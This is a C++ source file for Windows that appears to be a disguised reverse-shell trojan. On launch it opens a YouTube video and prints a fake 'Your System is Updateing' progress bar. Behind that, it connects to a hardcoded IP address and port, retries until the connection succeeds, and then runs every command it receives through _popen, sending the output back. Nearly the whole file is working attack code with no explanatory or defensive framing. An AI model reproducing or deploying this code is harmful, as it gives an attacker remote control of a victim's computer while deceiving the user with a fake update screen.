#include<bits/stdc++.h>
#define ll long long
#define do {
#define done }
#define read std::cin>>
#define echo std::cout<<
#define start_ int main()
#define finish return 0;
#define bzero(p,size) (void)memset((p),0,(size))
#include<windows.h>


using namespace std;


  const char* url = "https://www.youtube.com/watch?v=g3HvjO3mQcc&ab_channel=TheeTube";


class Algo{
public:
          void Solve()
          {
             ShellExecute(0, "open", url, 0, 0, SW_SHOWNORMAL);

          }
          void Solve2()
          {
              echo "Your System is Updateing "<<"\n";
              for(int i=0;i<100;i++)
              {
                  Sleep(50);
                 echo "#";
              }

          }










};
int sock;
void shell()
{
      char buffer[1024];
      char container[1024];
      char total_response[18384];

      while(1)
      {
         jump:
         bzero(buffer,1024);
         bzero(container,sizeof(container));
         bzero(total_response,sizeof(total_response));
         recv(sock,buffer,sizeof(buffer),0);

         if(strncmp("q",buffer,1)== 0){
            closesocket(sock);
	        exit(0);
	      }

         else{
              FILE *fp;
	          fp=_popen(buffer, "r");
              while(fgets(container,1024,fp)!=NULL)
              {
                 strcat(total_response,container);
              }
	      send(sock,total_response,sizeof(total_response),0);
	      fclose(fp);
	      }
      }

}


start_
do
     Algo al;
     al.Solve();
     al.Solve2();

     struct sockaddr_in x;
     ll  port;
     char *ip;
     WSADATA wsaData;

     ip="192.168.0.104";
     port=1234;


      if(WSAStartup(MAKEWORD(2,0),&wsaData)!=0)
        {
           exit(1);
        }

     sock=socket(AF_INET,SOCK_STREAM,0);
     memset(&x,0,sizeof(x));
     x.sin_family=AF_INET;
     x.sin_addr.s_addr=inet_addr(ip);
     x.sin_port=htons(port);

     start:
     while(connect(sock,(struct sockaddr *) &x,sizeof(x))!=0)
     {
         Sleep(10);
         goto start;
     }
     shell();


 finish
done
